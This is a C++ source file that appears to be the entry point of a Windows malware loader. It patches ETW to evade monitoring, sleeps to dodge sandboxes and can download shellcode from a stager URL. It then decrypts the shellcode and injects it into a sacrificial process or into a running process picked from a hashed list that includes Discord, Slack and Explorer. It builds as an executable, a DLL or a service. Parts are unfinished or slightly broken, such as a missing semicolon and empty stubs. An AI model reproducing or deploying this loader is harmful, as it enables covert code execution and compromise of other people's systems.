#include "config.hpp"
#include "malapi.hpp"
#include "execute.hpp"
#include "encrypt.hpp"

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

VOID entry(void)
{
	DWORD	pid = 0;
	HANDLE	process_handle = INVALID_HANDLE_VALUE;

#pragma region Guard Rails

#pragma endregion

#pragma region Evasion

#if SLEEP_ENABLED
	SleepMethod(SLEEP_TIME);
#else
#endif

	//#if ANTI_SANDBOX_ENABLED
	//#else
	//#endif

#if PATCH_ENABLED_ETW
	PatchEtw();
#else
#endif

#if PATCH_METHOD_AMSI
#else
#endif

#pragma endregion

#if CONFIG_STAGE_METHOD == 2
	PBYTE downloaded_shellcode = NULL;
	SIZE_T shellcode_size = NULL;

	if (!malapi::DownloadShellcode(STAGER_URL, STAGER_FILE, STAGER_SSL, &downloaded_shellcode, &shellcode_size))
	{
		LOG_ERROR("Failed to download shellcode.");
		return;
	}

	unsigned char* shellcode = downloaded_shellcode;
#else
	SIZE_T shellcode_size = sizeof(shellcode);
#endif

#if SLEEP_ENABLED
	SleepMethod(SLEEP_TIME);
#endif

#if CONFIG_CREATE_PROCESS_METHOD == 1
	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;
	process_handle = malapi::CreateSuspendedProcess((LPSTR)CONFIG_SACRIFICIAL_PROCESS);

	SleepMethod(SLEEP_TIME);

	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key))

#elif CONFIG_CREATE_PROCESS_METHOD == 2
	//
	// ProcessHollowing
	// AddressOfEntryPoint
	// DoppleGanging
	//
	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;

	SleepMethod(SLEEP_TIME);

	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));

	process_handle = malapi::EntryPointHandle((LPSTR)file_path, shellcode, sizeof(shellcode)); // thread handle

#else
	constexpr ULONG targets[] = {
		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"), // dev win 10
		malapi::HashStringFowlerNollVoVariant1a("Notepad.exe"), // dev win 11
		malapi::HashStringFowlerNollVoVariant1a("Discord.exe"),
		malapi::HashStringFowlerNollVoVariant1a("slack.exe"),
		malapi::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"),
		malapi::HashStringFowlerNollVoVariant1a("slpwow64.exe"),
		malapi::HashStringFowlerNollVoVariant1a("sihost.exe"),
		malapi::HashStringFowlerNollVoVariant1a("msiexec.exe"),
		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
		malapi::HashStringFowlerNollVoVariant1a("devenv.exe"),
		malapi::HashStringFowlerNollVoVariant1a("cloudflared.exe"),
		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"), // if all else fails
	};

	pid = malapi::GetPidFromHashedList((DWORD*)targets, sizeof(targets));

	if (pid == NULL)
	{
		LOG_ERROR("Error getting Process ID.");
		return;
	}
	LOG_SUCCESS("Process ID: %d", pid);
	process_handle = malapi::GetProcessHandle(pid);

	SleepMethod(SLEEP_TIME);

	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));

#endif

	if (!ExecuteShellcode(process_handle, shellcode, shellcode_size))
	{
		LOG_ERROR("Failed to execute shellcode.");
	}
}

#pragma region [alternate entrypoints]

#if _DEBUG

#if CONFIG_COMPILATION_OPTION == 1

int main(void) { entry(); return 0; }

#elif CONFIG_COMPILATION_OPTION == 2

BOOL APIENTRY WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		entry();
		break;
	}

	case DLL_PROCESS_DETACH:
	{
		if (lpvReserved != nullptr)
		{
			break;
		}
		break;
	}
	}
	return TRUE;
}

#elif CONFIG_COMPILATION_OPTION == 3

//
// Services https://learn.microsoft.com/en-us/windows/win32/services/writing-a-service-program-s-main-function
//
#define SVCNAME TEXT("AbleSvc")

// https://github.com/HavocFramework/Havoc/blob/dev/payloads/Demon/src/main/MainSvc.c
SERVICE_STATUS_HANDLE StatusHandle = { 0 };
SERVICE_STATUS        SvcStatus = {
	.dwServiceType = SERVICE_WIN32,
	.dwCurrentState = SERVICE_START_PENDING,
	.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN,
};

HANDLE                  ghSvcStopEvent = NULL;

VOID WINAPI WinMain()
{
}

VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
}

VOID WINAPI SrvCtrlHandler(DWORD control_code)
{
	switch (control_code)
	{
	}
}

#endif

#endif

#pragma endregion
